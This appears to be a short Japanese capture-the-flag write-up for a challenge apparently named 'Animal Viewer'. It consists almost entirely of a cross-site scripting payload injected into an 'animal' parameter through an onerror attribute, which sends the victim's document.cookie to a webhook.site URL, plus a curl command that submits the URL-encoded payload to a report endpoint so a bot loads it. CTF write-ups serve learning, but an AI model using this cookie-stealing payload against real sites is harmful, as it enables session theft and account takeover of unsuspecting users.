```
" onerror="new Image().src='https://webhook.site/[xxx]c='+encodeURIComponent(document.cookie)" x="
```

これを`[ANIMAL]`のところに入れ込み、XSSをする。

URLエンコードしてcurlで送信する例:

```bash
curl -s -v -X POST http://34.170.146.252:11360/api/report \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://animal-viewer:3000/?animal=%22%20onerror%3D%22new%20Image().src%3D%27https%3A%2F%2Fwebhook.site%2F[xxx]%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%20x%3D%22"}'
```

`[xxx]`の部分は自分のWebhook URLに置き換える。

## 参考文献

[Animal Viewer](https://www.notion.so/kakur41-wrteup/Animal-Viewer-2efda8520c02808880fdfaa79ee2ca81)